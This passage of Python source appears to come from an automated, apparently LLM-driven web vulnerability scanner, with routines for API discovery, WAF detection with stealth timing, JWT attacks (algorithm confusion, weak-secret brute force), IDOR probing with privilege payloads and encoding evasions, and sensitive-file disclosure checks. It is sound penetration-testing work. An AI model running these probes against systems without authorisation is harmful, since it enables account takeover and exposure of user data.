    return vulnerabilities

def _analyze_waf_bypass_opportunities(response: requests.Response, url: str, method: str) -> List[Vulnerability]:
    """Analyze WAF bypass opportunities"""
    
    vulnerabilities = []
    
    # Check for WAF signatures
    waf_headers = ['cf-ray', 'x-sucuri-id', 'x-akamai-edgescape', 'server-cloudflare']
    detected_waf = None
    
    for header in response.headers:
        header_lower = header.lower()
        if any(waf_sig in header_lower for waf_sig in waf_headers):
            detected_waf = header
            break
    
    if detected_waf:
        vuln = create_vulnerability(
            vuln_type='WAF Detection',
            severity='Info',
            evidence=f'WAF detected via header: {detected_waf}',
            url=url,
            technique='WAF fingerprinting',
            remediation='WAF bypass techniques may be required for further testing'
        )
        vulnerabilities.append(vuln)
    
    return vulnerabilities

def _get_api_delay(discovery_mode: str, target_context: PayloadTargetContext) -> float:
    """Calculate context-aware delay between requests"""
    
    base_delay = {
        'basic': 0.2,
        'comprehensive': 0.1,
        'aggressive': 0.05,
        'stealth': 0.5
    }.get(discovery_mode, 0.1)
    
    # Increase delay if WAF detected
    if target_context.has_waf:
        base_delay *= 2
    
    # Framework-specific adjustments
    if target_context.framework:
        if 'django' in target_context.framework.lower():
            base_delay *= 1.2  # Django can be slower
    
    return base_delay

def _perform_post_discovery_analysis(discovered_endpoints: List[Dict], 
                                   target_context: PayloadTargetContext, 
                                   session: requests.Session) -> List[Vulnerability]:
    """Perform additional analysis on discovered endpoints"""
    
    vulnerabilities = []
    
    try:
        # Analyze endpoint patterns
        pattern_vulns = _analyze_endpoint_patterns(discovered_endpoints)
        vulnerabilities.extend(pattern_vulns)
        
        # Check for common API vulnerabilities on discovered endpoints
        if len(discovered_endpoints) > 0:
            sample_endpoint = discovered_endpoints[0]
            
            # Test for common API vulnerabilities
            if sample_endpoint['status_code'] == 200:
                # Test for parameter pollution
                pollution_vulns = _test_parameter_pollution(
                    session, sample_endpoint['url'], target_context
                )
                vulnerabilities.extend(pollution_vulns)
    
    except Exception as e:
        logging.debug(f"Post-discovery analysis error: {e}")
    
    return vulnerabilities

def _analyze_endpoint_patterns(discovered_endpoints: List[Dict]) -> List[Vulnerability]:
    """Analyze discovered endpoint patterns for security issues"""
    
    vulnerabilities = []
    
    # Check for versioning inconsistencies
    versions = set()
    for endpoint in discovered_endpoints:
        url = endpoint['url']
        version_match = re.search(r'/v(\d+)/', url)
        if version_match:
            versions.add(version_match.group(1))
    
    if len(versions) > 2:
        vuln = create_vulnerability(
            vuln_type='Multiple API Versions Exposed',
            severity='Low',
            evidence=f'Multiple API versions detected: {", ".join(sorted(versions))}',
            technique='Pattern analysis',
            business_impact='Potential security inconsistencies across versions',
            remediation='Review and deprecate old API versions'
        )
        vulnerabilities.append(vuln)
    
    return vulnerabilities

def _test_parameter_pollution(session: requests.Session, url: str, 
                            target_context: PayloadTargetContext) -> List[Vulnerability]:
    """Test for HTTP parameter pollution vulnerabilities"""
    
    vulnerabilities = []
    
    try:
        # Test duplicate parameters
        test_url = f"{url}?test=1&test=2"
        response = session.get(test_url, timeout=10)
        
        if response.status_code == 200:
            # Check if both parameters are processed
            if 'test' in response.text.lower():
                vuln = create_vulnerability(
                    vuln_type='Potential HTTP Parameter Pollution',
                    severity='Medium',
                    evidence='API may be vulnerable to parameter pollution attacks',
                    url=test_url,
                    technique='Parameter manipulation',
                    business_impact='Input validation bypass potential',
                    remediation='Implement proper parameter parsing and validation'
                )
                vulnerabilities.append(vuln)
    
    except Exception as e:
        logging.debug(f"Parameter pollution test error: {e}")
    
    return vulnerabilities

def _assess_api_discovery_business_impact(discovered_endpoints: List[Dict], 
                                        vulnerabilities: List[Vulnerability], 
                                        target_context: PayloadTargetContext) -> str:
    """Assess business impact of API discovery results"""
    
    endpoint_count = len(discovered_endpoints)
    
    # Calculate risk levels
    high_risk_endpoints = sum(1 for ep in discovered_endpoints 
                            if any(pattern in ep['url'].lower() 
                                 for pattern in ['admin', 'config', 'secret', 'key']))
    
    critical_vulns = sum(1 for v in vulnerabilities 
                        if (v.severity if isinstance(v, Vulnerability) else v.get('severity', '')) == 'Critical')
    
    impact_parts = []
    
    if endpoint_count > 0:
        impact_parts.append(f"Discovered {endpoint_count} API endpoints")
    
    if high_risk_endpoints > 0:
        impact_parts.append(f"{high_risk_endpoints} high-risk endpoints identified")
    
    if critical_vulns > 0:
        impact_parts.append(f"{critical_vulns} critical vulnerabilities found")
    
    if target_context.framework:
        impact_parts.append(f"Framework: {target_context.framework}")
    
    return "; ".join(impact_parts) if impact_parts else "API surface mapping completed"

def _assess_api_discovery_compliance_risk(vulnerabilities: List[Vulnerability], 
                                        target_context: PayloadTargetContext) -> str:
    """Assess compliance risk from API discovery findings"""
    
    risk_factors = []
    
    # Check for authentication issues
    auth_issues = sum(1 for v in vulnerabilities 
                     if isinstance(v, Vulnerability) and 'auth' in v.type.lower())
    if auth_issues > 0:
        risk_factors.append("Authentication control failures")
    
    # Check for information disclosure
    info_disclosure = sum(1 for v in vulnerabilities 
                         if isinstance(v, Vulnerability) and 'disclosure' in v.type.lower())
    if info_disclosure > 0:
        risk_factors.append("Data protection violations")
    
    # Framework-specific compliance risks
    if target_context.framework:
        if 'django' in target_context.framework.lower():
            risk_factors.append("Python/Django security standards")
    
    return "; ".join(risk_factors) if risk_factors else "Standard API security review"

def _get_applied_optimizations(target_context: PayloadTargetContext) -> List[str]:
    """Get list of context-aware optimizations applied"""
    
    optimizations = []
    
    if target_context.framework:
        optimizations.append(f"Framework-specific testing ({target_context.framework})")
    
    if target_context.cms:
        optimizations.append(f"CMS-specific endpoints ({target_context.cms})")
    
    if target_context.database:
        optimizations.append(f"Database-aware testing ({target_context.database})")
    
    if target_context.has_waf:
        optimizations.append("WAF-aware rate limiting")
    
    if target_context.authentication_type:
        optimizations.append(f"Authentication-aware testing ({target_context.authentication_type})")
    
    return optimizations


# ===== JWT VULNERABILITY TESTING FUNCTIONS =====

def jwt_vulnerability_test(token: str, target_context: Union[PayloadTargetContext, Dict[str, Any]] = None) -> ToolCallResult:
 
    start_time = time.time()
    vulnerabilities = []
    
    # Convert dict to PayloadTargetContext if needed

    target_context = PayloadTargetContext.from_dict(target_context)

    
    try:
        # Validate JWT format
        if not _is_jwt_format(token):
            return ToolCallResult(
                success=False,
                tool_name="JWT Vulnerability Test",
                error="Invalid JWT format",
                execution_time=time.time() - start_time
            )
        
        # Decode header and payload without verification
        header = pyjwt.get_unverified_header(token)
        payload = pyjwt.decode(token, options={"verify_signature": False})
        
        # Test algorithm confusion with context awareness
        if _test_jwt_algorithm_confusion(token, header, payload, target_context):
            vuln = create_vulnerability(
                vuln_type='JWT Algorithm Confusion',
                severity='Critical',
                evidence='JWT algorithm can be manipulated to bypass signature verification',
                tool='JWT Security Test',
                technique='Algorithm confusion attack',
                remediation=_get_jwt_remediation('algorithm_confusion', target_context)
            )
            vulnerabilities.append(vuln)
        
        # Test weak secrets with context-aware wordlists
        weak_secret = _test_jwt_weak_secret(token, target_context)
        if weak_secret:
            vuln = create_vulnerability(
                vuln_type='JWT Weak Secret',
                severity='Critical',
                evidence=f'JWT signed with weak secret: {weak_secret}',
                tool='JWT Security Test',
                technique='Weak secret brute force',
                remediation=_get_jwt_remediation('weak_secret', target_context)
            )
            vulnerabilities.append(vuln)
        
        # Test critical claims manipulation
        critical_claims = _analyze_jwt_claims(payload, target_context)
        if critical_claims:
            vuln = create_vulnerability(
                vuln_type='JWT Critical Claims',
                severity='High',
                evidence=f'JWT contains critical claims that could be manipulated: {", ".join(critical_claims)}',
                tool='JWT Security Test',
                technique='Claims manipulation',
                remediation=_get_jwt_remediation('claims_manipulation', target_context)
            )
            vulnerabilities.append(vuln)
        
        # Test expiration and timing issues
        timing_issues = _test_jwt_timing(payload, target_context)
        if timing_issues:
            vulnerabilities.extend(timing_issues)
        
        # Context-aware additional tests
        additional_vulns = _perform_context_jwt_tests(token, header, payload, target_context)
        vulnerabilities.extend(additional_vulns)
        
        execution_time = time.time() - start_time
        
        # Calculate business impact and compliance risk based on context
        business_impact = _assess_jwt_business_impact(vulnerabilities, target_context)
        compliance_risk = _assess_jwt_compliance_risk(vulnerabilities, target_context)
        
        return ToolCallResult(
            success=True,
            tool_name="JWT Vulnerability Test",
            vulnerabilities=vulnerabilities,
            execution_time=execution_time,
            metadata={
                'header': header,
                'payload_claims': list(payload.keys()),
                'algorithm': header.get('alg', 'unknown'),
                'context_applied': target_context.to_dict()
            },
            business_impact=business_impact,
            cvss_score=max([v.cvss_score if isinstance(v, Vulnerability) else v.get('cvss_score', 0.0) for v in vulnerabilities] + [0.0]),
            compliance_risk=compliance_risk
        )
        
    except Exception as e:
        return ToolCallResult(
            success=False,
            tool_name="JWT Vulnerability Test",
            error=str(e),
            execution_time=time.time() - start_time
        )

def _is_jwt_format(token: str) -> bool:
    """Check if string is valid JWT format"""
    try:
        parts = token.split('.')
        if len(parts) != 3:
            return False
        
        # Try to decode header
        header = base64.urlsafe_b64decode(parts[0] + '==')
        header_json = json.loads(header)
        return 'alg' in header_json
    except Exception:
        return False

def _test_jwt_algorithm_confusion(token: str, header: Dict, payload: Dict, target_context: PayloadTargetContext) -> bool:
    """Test for algorithm confusion vulnerabilities with context awareness"""
    try:
        algorithm = header.get('alg', '').lower()
        
        # Check for dangerous algorithms
        if algorithm == 'none':
            return True
            
        # Test algorithm switching (RS256 to HS256) - more critical for certain frameworks
        if algorithm.startswith('rs') or algorithm.startswith('es'):
            # Framework-specific algorithm confusion risks
            if target_context.framework in ['nodejs', 'express']:
                return True  # Node.js JWT libraries commonly vulnerable
            elif target_context.language == 'python':
                return True  # Many Python JWT libraries affected
                
        return False
    except:
        return False

def _test_jwt_weak_secret(token: str, target_context: PayloadTargetContext) -> Optional[str]:
    """Test for weak JWT secrets with context-aware wordlists"""
    try:
        # Base weak secrets from payload library
        weak_secrets = PayloadLibrary.JWT_ATTACKS['weak_secrets'].copy()
        
        # Add context-specific secrets
        if target_context.framework:
            weak_secrets.extend([
                target_context.framework.lower(),
                f"{target_context.framework.lower()}_secret",
                f"{target_context.framework.lower()}123"
            ])
        
        if target_context.language:
            weak_secrets.extend([
                target_context.language.lower(),
                f"{target_context.language.lower()}_key"
            ])
        
        for secret in weak_secrets:
            try:
                pyjwt.decode(token, secret, algorithms=['HS256', 'HS384', 'HS512'])
                return secret
            except pyjwt.InvalidSignatureError:
                continue
            except:
                continue
                
        return None
    except:
        return None

def _analyze_jwt_claims(payload: Dict, target_context: PayloadTargetContext) -> List[str]:
    """Analyze JWT claims for security issues with context awareness"""
    critical_claims = []
    
    for claim, value in payload.items():
        # Check for admin/privilege claims
        if claim.lower() in ['role', 'roles', 'admin', 'is_admin', 'privilege', 'permissions', 'scope']:
            if str(value).lower() in ['admin', 'administrator', 'root', 'superuser', 'true', '1']:
                critical_claims.append(f"{claim}: {value}")
                
        # Framework-specific claim analysis
        if target_context.framework == 'laravel' and claim.lower() == 'role':
            critical_claims.append(f"{claim}: {value} (Laravel privilege)")
        elif target_context.framework == 'django' and claim.lower() == 'is_staff':
            critical_claims.append(f"{claim}: {value} (Django staff privilege)")
            
        # Check for user identification that could be manipulated
        if claim.lower() in ['sub', 'user_id', 'uid', 'username', 'id']:
            critical_claims.append(f"{claim}: {value} (potential IDOR)")
            
    return critical_claims

def _test_jwt_timing(payload: Dict, target_context: PayloadTargetContext) -> List[Vulnerability]:
    """Test for JWT timing and expiration issues with context awareness"""
    vulnerabilities = []
    current_time = time.time()
    
    try:
        # Check expiration with context-appropriate thresholds
        max_allowed_exp = 24 * 60 * 60  # Default 1 day
        if target_context.framework in ['django', 'laravel']:
            max_allowed_exp = 15 * 60  # 15 minutes for web frameworks
        elif target_context.authentication_type == 'bearer':
            max_allowed_exp = 60 * 60  # 1 hour for API tokens
            
        if 'exp' in payload:
            exp_time = payload['exp']
            if exp_time > current_time + max_allowed_exp:
                vuln = create_vulnerability(
                    vuln_type='JWT Long Expiration',
                    severity='Medium',
                    evidence=f'JWT expires in {(exp_time - current_time) / (24 * 60 * 60):.1f} days',
                    tool='JWT Security Test',
                    technique='Token lifetime analysis',
                    remediation=_get_jwt_remediation('long_expiration', target_context)
                )
                vulnerabilities.append(vuln)
        else:
            vuln = create_vulnerability(
                vuln_type='JWT No Expiration',
                severity='High',
                evidence='JWT has no expiration claim (exp)',
                tool='JWT Security Test',
                technique='Token lifetime analysis',
                remediation=_get_jwt_remediation('no_expiration', target_context)
            )
            vulnerabilities.append(vuln)
            
        # Framework-specific timing checks
        if target_context.framework in ['django', 'laravel'] and 'iat' not in payload:
            vuln = create_vulnerability(
                vuln_type='JWT No Issued At',
                severity='Medium',  # Higher severity for web frameworks
                evidence='JWT missing issued at claim (iat) - critical for session tracking',
                tool='JWT Security Test',
                technique='Token metadata analysis',
                remediation=_get_jwt_remediation('no_issued_at', target_context)
            )
            vulnerabilities.append(vuln)
                
    except Exception:
        pass
        
    return vulnerabilities

def _perform_context_jwt_tests(token: str, header: Dict, payload: Dict, target_context: PayloadTargetContext) -> List[Vulnerability]:
    """Perform additional context-aware JWT security tests"""
    vulnerabilities = []
    
    try:
        # Framework-specific tests
        if target_context.framework == 'django':
            vulnerabilities.extend(_test_django_jwt_issues(payload))
        elif target_context.framework == 'laravel':
            vulnerabilities.extend(_test_laravel_jwt_issues(payload))
        elif target_context.framework in ['nodejs', 'express']:
            vulnerabilities.extend(_test_nodejs_jwt_issues(header, payload))
            
        # Authentication type specific tests
        if target_context.authentication_type == 'bearer':
            vulnerabilities.extend(_test_bearer_jwt_issues(payload))
            
        # Test for JWT bombs (DoS)
        if len(token) > 8192:  # Large token
            vuln = create_vulnerability(
                vuln_type='JWT Bomb',
                severity='Medium',
                evidence=f'JWT token is {len(token)} bytes - potential DoS vector',
                tool='JWT Security Test',
                technique='Resource exhaustion',
                remediation="Implement token size limits and parsing timeouts"
            )
            vulnerabilities.append(vuln)
            
    except Exception:
        pass
        
    return vulnerabilities

def _get_jwt_remediation(vuln_type: str, target_context: PayloadTargetContext) -> str:
    """Get context-aware remediation advice"""
    framework = target_context.framework or 'generic'
    
    remediations = {
        'algorithm_confusion': {
            'django': "Use Django's built-in JWT validation with explicit algorithm whitelist",
            'laravel': "Use Laravel Passport or Sanctum with proper algorithm validation",
            'nodejs': "Use jsonwebtoken library with explicit algorithms parameter",
            'generic': "Explicitly validate JWT algorithm and use asymmetric keys where appropriate"
        },
        'weak_secret': {
            'django': "Use Django's SECRET_KEY generation or environment variables for JWT secrets",
            'laravel': "Use Laravel's APP_KEY or proper environment configuration",
            'generic': "Use cryptographically strong, randomly generated secrets with sufficient entropy"
        },
        'claims_manipulation': {
            'django': "Validate critical claims server-side using Django permissions",
            'laravel': "Use Laravel's authorization policies to validate JWT claims",
            'generic': "Validate all critical claims server-side with proper authorization checks"
        },
        'long_expiration': {
            'django': "Set shorter token expiration in Django JWT settings",
            'laravel': "Configure appropriate TTL in Laravel Passport/Sanctum",
            'generic': "Use shorter token expiration times and implement refresh tokens"
        },
        'no_expiration': {
            'generic': "Always include expiration claim in JWTs with appropriate lifetime"
        },
        'no_issued_at': {
            'generic': "Include issued at claim for better token tracking and invalidation"
        }
    }
    
    return remediations.get(vuln_type, {}).get(framework, remediations.get(vuln_type, {}).get('generic', 'Apply security best practices'))

def _test_django_jwt_issues(payload: Dict) -> List[Vulnerability]:
    """Test for Django-specific JWT issues"""
    vulnerabilities = []
    
    if 'user_id' in payload and 'is_staff' not in payload:
        vuln = create_vulnerability(
            vuln_type='Django JWT Missing Staff Check',
            severity='Medium',
            evidence='JWT contains user_id but missing is_staff claim',
            tool='JWT Security Test',
            technique='Framework-specific analysis',
            remediation="Include is_staff and is_superuser claims in Django JWTs"
        )
        vulnerabilities.append(vuln)
        
    return vulnerabilities

def _test_laravel_jwt_issues(payload: Dict) -> List[Vulnerability]:
    """Test for Laravel-specific JWT issues"""
    vulnerabilities = []
    
    if 'sub' in payload and 'role' not in payload:
        vuln = create_vulnerability(
            vuln_type='Laravel JWT Missing Role',
            severity='Medium',
            evidence='JWT contains user ID but missing role information',
            tool='JWT Security Test',
            technique='Framework-specific analysis',
            remediation="Include role or permissions in Laravel JWT payload"
        )
        vulnerabilities.append(vuln)
        
    return vulnerabilities

def _test_nodejs_jwt_issues(header: Dict, payload: Dict) -> List[Vulnerability]:
    """Test for Node.js/Express-specific JWT issues"""
    vulnerabilities = []
    
    # Check for common Node.js JWT library vulnerabilities
    if header.get('alg') == 'RS256' and 'kid' not in header:
        vuln = create_vulnerability(
            vuln_type='Missing Key ID',
            severity='Low',
            evidence='RS256 JWT missing kid (key ID) header',
            tool='JWT Security Test',
            technique='Framework-specific analysis',
            remediation="Include key ID in JWT header for proper key management"
        )
        vulnerabilities.append(vuln)
        
    return vulnerabilities

def _test_bearer_jwt_issues(payload: Dict) -> List[Vulnerability]:
    """Test for Bearer token specific issues"""
    vulnerabilities = []
    
    if 'scope' not in payload:
        vuln = create_vulnerability(
            vuln_type='Missing Scope Claim',
            severity='Medium',
            evidence='Bearer JWT missing scope claim for API access control',
            tool='JWT Security Test',
            technique='Authentication type analysis',
            remediation="Include scope claim in Bearer JWTs for proper API authorization"
        )
        vulnerabilities.append(vuln)
        
    return vulnerabilities

def _assess_jwt_business_impact(vulnerabilities: List[Vulnerability], target_context: PayloadTargetContext) -> str:
    """Assess business impact based on JWT vulnerabilities and context"""
    if not vulnerabilities:
        return "No significant JWT security issues identified"
        
    critical_count = len([v for v in vulnerabilities if v.severity == 'Critical'])
    high_count = len([v for v in vulnerabilities if v.severity == 'High'])
    
    if critical_count > 0:
        impact = f"Critical authentication bypass possible affecting {target_context.framework or 'application'} security"
    elif high_count > 0:
        impact = f"High risk of unauthorized access and privilege escalation"
    else:
        impact = "Medium risk authentication vulnerabilities identified"
        
    return impact

def _assess_jwt_compliance_risk(vulnerabilities: List[Vulnerability], target_context: PayloadTargetContext) -> str:
    """Assess compliance risk based on JWT vulnerabilities"""
    if not vulnerabilities:
        return "JWT implementation meets basic security standards"
        
    critical_types = [v.type for v in vulnerabilities if v.severity in ['Critical', 'High']]
    
    if any('Algorithm Confusion' in t or 'Weak Secret' in t for t in critical_types):
        return "High compliance risk - authentication controls inadequate for regulatory requirements"
    elif critical_types:
        return "Medium compliance risk - authentication security controls need improvement"
    else:
        return "Low compliance risk - minor authentication security improvements recommended"


# ===== IDOR TESTING FUNCTIONS =====

def idor_test(endpoint: str, parameters: List[str] = None, payloads: List[str] = None,
              target_context: Union[PayloadTargetContext, Dict[str, Any]] = None) -> ToolCallResult:
   
    start_time = time.time()
    vulnerabilities = []
    
    try:
        target_context = PayloadTargetContext.from_dict(target_context)
            
        session = create_session()
        
        # Auto-detect parameters from URL if not provided
        if not parameters:
            parameters = _extract_parameters_from_url(endpoint)
            if not parameters:
                # Common IDOR parameter names as fallback
                parameters = ['id', 'user_id', 'account_id', 'object_id', 'doc_id']
        
        # Use LLM payloads or fallback to PayloadLibrary
        if not payloads:
            payloads = _get_idor_fallback_payloads(target_context)
        
        # Get baseline response for comparison
        baseline_response = session.get(endpoint)
        baseline_length = len(baseline_response.text) if baseline_response else 0
        
        # Test each parameter with each payload
        for param in parameters:
            for payload in payloads:
                try:
                    # Test URL parameter manipulation
                    test_url = _build_idor_test_url(endpoint, param, payload)
                    response = session.get(test_url, timeout=10)
                    
                    # Analyze response for IDOR vulnerability
                    vuln_data = _detect_idor_vulnerability(
                        response, baseline_response, payload, param, test_url, target_context
                    )
                    
                    if vuln_data:
                        vulnerabilities.append(vuln_data)
                    
                    # Test POST data if framework supports it
                    if target_context.supports_post:
                        post_response = session.post(endpoint, data={param: payload}, timeout=10)
                        post_vuln = _detect_idor_vulnerability(
                            post_response, baseline_response, payload, param, endpoint, target_context, method="POST"
                        )
                        if post_vuln:
                            vulnerabilities.append(post_vuln)
                    
                    # Rate limiting
                    time.sleep(0.1)
                    
                except Exception as e:
                    logging.warning(f"IDOR test failed for {param}={payload}: {e}")
                    continue
        
        # Test path-based IDOR if applicable
        if target_context.framework in ['rails', 'express', 'django']:
            path_vulns = _test_path_idor(session, endpoint, payloads, target_context)
            vulnerabilities.extend(path_vulns)
        
        execution_time = time.time() - start_time
        
        metadata = {
            'endpoint': endpoint,
            'parameters_tested': parameters,
            'payloads_count': len(payloads),
            'framework': target_context.framework,
            'llm_payloads_used': payloads != _get_idor_fallback_payloads(target_context)
        }
        
        return ToolCallResult(
            success=True,
            tool_name="IDOR Test",
            vulnerabilities=vulnerabilities,
            execution_time=execution_time,
            metadata=metadata,
            business_impact=_assess_idor_business_impact(vulnerabilities, target_context),
            cvss_score=max([v.cvss_score for v in vulnerabilities] + [0.0]),
            compliance_risk=_assess_idor_compliance_risk(vulnerabilities, target_context)
        )
        
    except Exception as e:
        return ToolCallResult(
            success=False,
            tool_name="IDOR Test",
            error=str(e),
            execution_time=time.time() - start_time
        )


def _get_idor_fallback_payloads(target_context: PayloadTargetContext) -> List[str]:
    """Get IDOR payloads from PayloadLibrary as fallback when LLM doesn't provide them"""
    base_payloads = ['1', '2', '999', '0', '-1', 'admin', 'root']
    
    # Add business logic payloads
    business_payloads = PayloadLibrary.BUSINESS_LOGIC_PAYLOADS['privilege_escalation']
    
    # Framework-specific additions
    if target_context.framework == 'django':
        base_payloads.extend(['pk=1', 'pk=2'])
    elif target_context.framework == 'rails':
        base_payloads.extend(['1-admin', '2-user'])
    elif target_context.framework == 'laravel':
        base_payloads.extend(['uuid-1', 'uuid-2'])
    
    # Add encoding evasions if WAF detected
    if target_context.has_waf:
        base_payloads.extend(['%31', '%32', '%2d%31'])  # URL encoded
    
    return base_payloads + business_payloads

def _extract_parameters_from_url(url: str) -> List[str]:
    """Extract parameter names from URL query string"""
    try:
        parsed = urlparse(url)
        if parsed.query:
            return [param.split('=')[0] for param in parsed.query.split('&') if '=' in param]
    except:
        pass
    return []

def _build_idor_test_url(endpoint: str, parameter: str, payload: str) -> str:
    """Build test URL with IDOR payload"""
    if '?' in endpoint:
        # Replace existing parameter or add new one
        if f'{parameter}=' in endpoint:
            return re.sub(rf'{parameter}=[^&]*', f'{parameter}={payload}', endpoint)
        else:
            return f"{endpoint}&{parameter}={payload}"
    else:
        return f"{endpoint}?{parameter}={payload}"

def _detect_idor_vulnerability(response, baseline_response, payload: str, parameter: str, 
                               url: str, target_context: PayloadTargetContext, method: str = "GET") -> Optional[Vulnerability]:
    """Detect IDOR vulnerability from response analysis"""
    if not response or response.status_code != 200:
        return None
    
    response_text = response.text.lower()
    baseline_text = baseline_response.text.lower() if baseline_response else ""
    
    # Check for successful access indicators
    success_indicators = ['user', 'profile', 'account', 'data', 'record', 'document']
    error_indicators = ['not found', 'access denied', 'unauthorized', 'forbidden']
    
    # Basic length-based detection
    length_diff = abs(len(response_text) - len(baseline_text))
    has_success_content = any(indicator in response_text for indicator in success_indicators)
    has_error_content = any(indicator in response_text for indicator in error_indicators)
    
    # IDOR detection logic
    if (length_diff > 100 and has_success_content and not has_error_content):
        severity = "High"
        if 'admin' in payload or 'root' in payload:
            severity = "Critical"
        
        evidence = f"IDOR vulnerability: Parameter '{parameter}' with value '{payload}' returned different content ({length_diff} chars difference)"
        
        return create_vulnerability(
            vuln_type="Insecure Direct Object Reference",
            severity=severity,
            evidence=evidence,
            parameter=parameter,
            url=url,
            payload=payload,
            response_code=response.status_code,
            technique=f"{method} parameter manipulation",
            business_impact=_get_idor_business_impact(payload, target_context),
            remediation=_get_idor_remediation(target_context),
            references=['CWE-639', 'OWASP-A01-2021']
        )
    
    return None

def _test_path_idor(session, endpoint: str, payloads: List[str], target_context: PayloadTargetContext) -> List[Vulnerability]:
    """Test path-based IDOR vulnerabilities"""
    vulnerabilities = []
    base_url = endpoint.rstrip('/')
    
    for payload in payloads[:5]:  # Limit to avoid too many requests
        try:
            test_url = f"{base_url}/{payload}"
            response = session.get(test_url, timeout=10)
            
            if response.status_code == 200 and len(response.text) > 500:
                vuln = create_vulnerability(
                    vuln_type="Path-based IDOR",
                    severity="Medium",
                    evidence=f"Path-based IDOR found: {test_url} returned content",
                    url=test_url,
                    payload=payload,
                    response_code=response.status_code,
                    technique="Path parameter manipulation",
                    business_impact="Potential unauthorized access via path manipulation",
                    remediation="Implement path-based access controls",
                    references=['CWE-639']
                )
                vulnerabilities.append(vuln)
        except:
            continue
    
    return vulnerabilities

def _get_idor_business_impact(payload: str, target_context: PayloadTargetContext) -> str:
    """Get business impact based on payload and context"""
    if payload in ['admin', 'root', 'administrator']:
        return "CRITICAL - Potential administrative account access"
    elif target_context.framework in ['django', 'rails', 'laravel']:
        return "HIGH - Potential user data exposure in web application"
    else:
        return "MEDIUM - Unauthorized access to resources"

def _get_idor_remediation(target_context: PayloadTargetContext) -> str:
    """Get remediation advice based on target context"""
    if target_context.framework == 'django':
        return "Implement Django's object-level permissions and use get_object_or_404() with user checks"
    elif target_context.framework == 'rails':
        return "Use Rails' strong parameters and implement before_action filters for authorization"
    elif target_context.framework == 'laravel':
        return "Implement Laravel's authorization policies and gate checks"
    else:
        return "Implement proper access control checks before object retrieval"

def _assess_idor_business_impact(vulnerabilities: List[Vulnerability], target_context: PayloadTargetContext) -> str:
    """Assess overall business impact of IDOR findings"""
    if not vulnerabilities:
        return "No IDOR vulnerabilities detected"
    
    critical_count = sum(1 for v in vulnerabilities if v.severity == "Critical")
    high_count = sum(1 for v in vulnerabilities if v.severity == "High")
    
    if critical_count > 0:
        return f"CRITICAL - {critical_count} critical IDOR vulnerabilities found allowing admin access"
    elif high_count > 0:
        return f"HIGH - {high_count} high-risk IDOR vulnerabilities found"
    else:
        return "MEDIUM - IDOR vulnerabilities detected with potential data exposure"

def _assess_idor_compliance_risk(vulnerabilities: List[Vulnerability], target_context: PayloadTargetContext) -> str:
    """Assess compliance risk from IDOR vulnerabilities with context awareness"""
    if not vulnerabilities:
        return "No compliance violations detected"
    
    frameworks = []
    risk_details = []
    
    # Context-aware compliance assessment
    critical_high_vulns = [v for v in vulnerabilities if v.severity in ["Critical", "High"]]
    
    if critical_high_vulns:
        # Framework-specific risks based on target context
        if target_context.framework in ['django', 'laravel', 'rails']:
            frameworks.extend(["GDPR", "CCPA"])  # Web frameworks often handle PII
            risk_details.append("Web application data breach")
            
        if target_context.cms in ['wordpress', 'drupal', 'joomla']:
            frameworks.extend(["GDPR", "CCPA"])
            risk_details.append("CMS user data exposure")
            
        if target_context.database in ['mysql', 'postgresql', 'mssql', 'oracle']:
            frameworks.extend(["SOX", "HIPAA"])
            risk_details.append("Database record access bypass")
            
        # Payment/financial context indicators
        if any('payment' in str(v.url).lower() or 'transaction' in str(v.url).lower() 
               or 'billing' in str(v.url).lower() for v in vulnerabilities):
            frameworks.extend(["PCI_DSS", "SOX"])
            risk_details.append("Financial data access")
            
        # Healthcare context indicators  
        if any('patient' in str(v.url).lower() or 'medical' in str(v.url).lower() 
               or 'health' in str(v.url).lower() for v in vulnerabilities):
            frameworks.extend(["HIPAA", "GDPR"])
            risk_details.append("Healthcare data breach")
            
        # API-specific compliance risks
        if target_context.supports_json and any('api' in str(v.url).lower() for v in vulnerabilities):
            frameworks.extend(["GDPR", "CCPA", "SOX"])
            risk_details.append("API data exposure")
    
    # Remove duplicates and assess severity
    frameworks = list(set(frameworks))
    
    if frameworks:
        risk_level = "CRITICAL" if len(critical_high_vulns) > 2 else "HIGH"
        details = " - " + ", ".join(set(risk_details)) if risk_details else ""
        return f"{risk_level} compliance violations: {', '.join(frameworks)}{details}"
    else:
        return "Medium compliance risk - unauthorized object access detected"



# ===== INFORMATION DISCLOSURE TESTING FUNCTIONS =====

def information_disclosure_test(url: str, target_context: Union[PayloadTargetContext, Dict[str, Any]] = None) -> ToolCallResult:
    start_time = time.time()
    vulnerabilities = []
    
    # Convert dict to PayloadTargetContext if needed
    if isinstance(target_context, dict):
        target_context = PayloadTargetContext.from_dict(target_context)
    elif target_context is None:
        target_context = PayloadTargetContext()
    
    try:
        session = create_session()
        base_url = url.rstrip('/')
        
        # Get context-aware sensitive file paths
        sensitive_paths = _get_context_aware_disclosure_paths(target_context)
        
        # Setup authentication if available
        session = _setup_disclosure_authentication(session, target_context)
        
        # Test sensitive files with context-aware approach
        for path in sensitive_paths:
            try:
                test_url = base_url + path
                response = _execute_context_aware_request(session, test_url, target_context)
                
                if response and response.status_code == 200:
                    risk_level = _assess_context_aware_file_risk(path, response, target_context)
                    if risk_level != 'Info':
                        vuln = create_vulnerability(
                            vuln_type='Information Disclosure',
                            severity=risk_level,
                            evidence=f'Sensitive file accessible: {path}',
                            url=test_url,
                            location=path,
                            response_code=response.status_code,
                            technique='Context-aware file access',
                            business_impact=_get_context_aware_disclosure_impact(path, target_context),
                            remediation=_get_context_aware_disclosure_remediation(path, target_context)
                        )
                        vulnerabilities.append(vuln)
                
            except Exception as e:
                logging.error(f"Error testing path {path}: {e}")
        
        # Test framework-specific error disclosure
        error_vulns = _test_context_aware_error_disclosure(session, url, target_context)
        vulnerabilities.extend(error_vulns)
        
        # Test HTTP headers with context awareness
        header_vulns = _test_context_aware_header_disclosure(session, url, target_context)
        vulnerabilities.extend(header_vulns)
        
        # Test technology-specific information disclosure
        tech_vulns = _test_technology_specific_disclosure(session, url, target_context)
        vulnerabilities.extend(tech_vulns)
        
        execution_time = time.time() - start_time
        
        return ToolCallResult(
            success=True,
            tool_name="Information Disclosure Test",
            vulnerabilities=vulnerabilities,
            execution_time=execution_time,
            metadata={
                'url': url,
                'paths_tested': len(sensitive_paths),
                'context_applied': target_context.to_dict(),
                'framework': target_context.framework,
                'language': target_context.language,
                'cms': target_context.cms
            },
            business_impact=_assess_context_disclosure_business_impact(vulnerabilities, target_context),
            cvss_score=max([v.cvss_score if isinstance(v, Vulnerability) else v.get('cvss_score', 0.0) for v in vulnerabilities] + [0.0]),
